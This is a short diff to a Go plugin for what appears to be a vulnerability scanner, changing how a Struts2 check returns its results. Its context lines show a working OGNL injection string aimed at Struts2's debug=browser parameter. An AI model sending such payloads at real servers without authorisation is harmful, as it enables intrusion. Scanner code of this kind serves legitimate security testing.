@@ -33,7 +33,9 @@ func (d *struts2_19) Init() plugin.Plugin {
 	return d.info
 }
 func (d *struts2_19) GetResult() []plugin.Plugin {
-	return d.result
+	var result = d.result
+	d.result = []plugin.Plugin{}
+	return result
 }
 func (d *struts2_19) Check(URL string, meta plugin.TaskMeta) (b bool) {
 	poc := "debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(66666687-100)):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
